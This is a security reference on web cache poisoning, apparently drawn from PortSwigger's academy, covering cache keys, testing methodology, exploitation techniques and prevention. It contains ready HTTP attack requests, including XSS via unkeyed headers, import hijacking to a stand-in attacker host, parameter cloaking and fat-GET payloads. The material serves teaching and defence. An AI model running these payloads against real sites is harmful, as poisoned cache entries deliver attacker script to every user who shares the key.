# Web Cache Poisoning — Deep Reference

Sources:
- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws

Web cache poisoning is an attack where you exploit the behaviour of a web server and its cache so that a **harmful HTTP response is served to other users**. It has two phases: (1) get the back-end to produce a harmful response, then (2) ensure that response is cached and delivered to victims.

---

## 1. How caches and cache keys work

A cache (CDN such as Cloudflare/Akamai/Fastly, a reverse proxy such as Varnish/nginx, or an application-level cache) sits between users and the origin to reduce load by reusing responses.

When a request arrives, the cache compares a fixed subset of the request's components against stored entries. That subset is the **cache key**. Typically the key = the request line (method + path + sometimes query string) + the `Host` header, and maybe a few others.

- **Keyed inputs** are part of the cache key — the cache distinguishes requests by them.
- **Unkeyed inputs** are *ignored* by the key but may still be processed by the back-end. The same cached response is returned regardless of their value.

This asymmetry is the whole bug class: if an unkeyed input changes the response and that response is cached, an attacker sets the unkeyed input to something harmful, gets it cached, and every later request with the same key receives it.

Useful response indicators:
- `X-Cache: hit | miss` (also `X-Cache-Hits`, `Age`) — was this served from cache.
- `CF-Cache-Status` (Cloudflare), `X-Served-By`/`X-Cache` (Fastly/Varnish), `Via`.
- `Cache-Control` / `Expires` — reveals TTL and purge cadence (helps time re-poisoning).
- `Vary` — lists request headers that the cache *does* treat as keyed (e.g. `Vary: User-Agent` means you must match the victim's UA). Leaked `Vary` helps you scope which users you can hit.

---

## 2. Constructing an attack (methodology)

### Step 1 — Identify and evaluate unkeyed inputs
- Add a **cache buster** to make a fresh key for every test (e.g. `?cb=<random>`), so you never touch the real cached entry.
- Inject candidate inputs one at a time and look for changes in the response.
- **Param Miner** (Burp BApp) automates this: "Guess headers", "Guess GET parameters", "Guess cookies". It sends large wordlists of likely-unkeyed headers/params and flags ones that influence the response. Findings appear in the Issues pane (Burp Pro) or the Output/Logger tab (Community). Param Miner can add cache busters automatically (it appends a random param and/or rotates a cache-buster header).
- Common unkeyed carriers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Forwarded-Server`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, the `Host` port, cookies, analytics params (`utm_content`, `utm_campaign`).

Manual confirmation that an input is unkeyed AND cacheable:
1. Request `GET /path?cb=1` with `X-Forwarded-Host: canary` → response reflects `canary`, `X-Cache: miss`.
2. Request `GET /path?cb=1` again **without** the header → if it still reflects `canary` and `X-Cache: hit`, the header is unkeyed and the poisoned response is cached.

### Step 2 — Elicit a harmful response
Find a gadget that turns the reflected/processed input into something dangerous:
- reflection into an HTML/attribute/script context (XSS),
- a value used to build a `src`/`href`/import URL (resource hijack),
- a value used to build a redirect `Location` (open redirect),
- data consumed by client-side JS that reaches a DOM sink.

### Step 3 — Get the response cached
Work out the caching rules empirically: which paths/extensions are cached, which status codes, which content types, what `Cache-Control` allows. Sometimes a static extension (`.js`, `.css`) or a particular route is cached while the base page isn't. Re-send until `X-Cache: hit`, then prove a *clean* request returns the payload.

---

## 3. Exploiting cache design flaws

These exploit the application handling unkeyed input unsafely, where responses are then cached.

### Unkeyed header → XSS
The header is reflected unsanitised into a cacheable page. Classic example: `X-Forwarded-Host` is used to build an Open Graph image URL in a `<meta>` tag.
```
GET /en?region=uk&cb=RANDOM HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
Once cached, every user on that key gets the payload.

### Unsafe resource import
The header builds an import URL for JS/CSS. Redirect the import to an attacker host:
```
GET /?cb=RANDOM HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
```
All users load `https://evil-user.net/...js` → attacker JS runs for everyone.

### Cookie-handling vulnerabilities
If the response varies by a cookie that is **not** in the cache key, poison the shared entry. Example: a `language` cookie selects a localized page; the cache ignores the cookie, so poisoning serves the wrong (attacker-chosen) variant — or a reflected cookie value — to all users.

### Exploiting DOM-based vulnerabilities (DOM data / dynamic imports)
A poisoned response can feed client-side code:
- Cached JSON config with a payload reaching a sink:
  ```json
  {"someProperty": "<svg onload=alert(1)>"}
  ```
  May need `Access-Control-Allow-Origin: *` if fetched cross-origin.
- Poison the value used in a dynamic `import()`/`<script src>` built at runtime by JS.

### Using multiple headers
Some gadgets need two unkeyed inputs together. E.g. combine `X-Forwarded-Host` (controls host) with `X-Forwarded-Scheme`/`X-Forwarded-Proto` (controls scheme) to produce a cacheable redirect to `http://attacker/...`.

### Information leakage
`Cache-Control`/`Age` reveal purge cadence (time your re-poison loop); leaked `Vary` reveals which keyed headers you must match to hit a given user segment.

---

## 4. Exploiting cache implementation flaws

These target how a *specific* cache builds/transforms the key — parsing discrepancies between cache and application turn "unexploitable" reflected bugs into cached attacks.

Workflow: find a **cache oracle** (a cacheable endpoint that gives feedback via headers/timing) → probe how it transforms the key → chain with a reflected gadget.

### Unkeyed port
`Host` is keyed but the port is stripped from the key on some caches:
```
GET / HTTP/1.1
Host: vulnerable-website.com:8080
```
If the port reaches app logic (e.g. into a redirect), you can poison with a malicious port while the key looks normal.

### Unkeyed query string
The whole query string is excluded from the key on some setups. A reflected XSS in a param becomes far worse: poison once, victims hitting the plain URL (no params) get the payload.
Detection — put the **cache buster in a keyed header**, not the query string, so the cache still collapses your test onto the target key:
```
Accept-Encoding: gzip, deflate, cachebuster123
Origin: https://cachebuster.domain.com
```

### Unkeyed query parameters
Specific params (e.g. `utm_content`) are excluded from the key. Harmless alone, but combine with parsing quirks below to smuggle a payload past the key.

### Cache parameter cloaking
The cache and the app disagree on parameter delimiters, so the payload is in a param the cache does NOT key.
- Second `?`: cache keys only up to the first `?`; app parses the rest:
  ```
  GET /?keyed_param=safe?excluded_param=payload HTTP/1.1
  ```
- Rails semicolon: Rails treats both `&` and `;` as delimiters; the cache treats only `&`:
  ```
  GET /?param=abc&utm_content=x;param=PAYLOAD HTTP/1.1
  ```
  Cache sees 2 params; Rails sees 3 and (last-duplicate-wins) uses `PAYLOAD` — but the keyed portion looks innocent.

### Fat GET requests
Cache keys the request line; the app reads a body or a method-override header:
```
GET /?param=innocent HTTP/1.1
Content-Length: 23

param=malicious_payload
```
or
```
GET /?param=innocent HTTP/1.1
X-HTTP-Method-Override: POST

param=malicious_payload
```
If the body / override header is unkeyed, you keep an innocent key but inject the payload.

### Normalized cache keys
The cache normalizes encoded vs raw before keying, but the app reflects raw. Encoded and unencoded map to the **same** key:
```
GET /example?param="><script>alert(1)</script>
GET /example?param=%22%3e%3cscript%3ealert(1)%3c/script%3e
```
Poison with the raw (executing) version; a victim's browser sends the encoded version, but normalization serves them the poisoned (executing) entry.

### Cache key injection
The cache builds the key by concatenating components with a delimiter (e.g. `__`) without escaping. Craft a request whose injected delimiters make its key identical to a victim's normal request, e.g. injecting via `Origin` so the resulting key equals `/path__Origin='-alert(1)-'__`, and the victim who browses that path gets the poisoned entry.

### Internal / fragment caches
App-level caches store response *fragments* (not whole responses) and may lack a conventional key. One poisoned fragment can appear on many pages. Indicators: response mixes current + previous request input; injected content shows up on pages you didn't target. Test only with domains/markers you control.

---

## 5. Using cache busters to test safely

A cache buster is a unique value that forces a distinct cache key for every test request, so your poisoned/probe responses are served **only to you**, never to real users.
- Simplest: a unique query param per request — `?cb=<random>` (Param Miner does this automatically).
- When the query string is unkeyed, bust via a **keyed header** instead: a unique `Accept-Encoding` token, or `Origin: https://<random>.domain.com`.
- Always carry a buster through both the poison request and the verification request, and use the *same* buster for the pair so you confirm a clean fetch hits your own entry.
- Never run a poison against a real, shared key (e.g. the live homepage) — that harms other users. Prove the bug on your busted key and stop.

---

## 6. Prevention

- Disable caching for responses that reflect/depend on unkeyed input or that are genuinely dynamic.
- Don't accept unnecessary request headers; strip/normalize `X-Forwarded-*`, `X-Host`, etc. at the edge.
- Prefer rewriting the inbound request (canonicalize Host/scheme) over merely excluding fields from the cache key.
- Avoid "fat GET" handling — don't let GET requests be driven by a body or method-override header.
- Make cache and application agree on parsing (delimiters, encoding, duplicate params); avoid unkeyed query strings/params that feed reflective sinks.
- Patch client-side gadgets (DOM sinks, unsafe imports) so a poisoned input has nowhere to land.
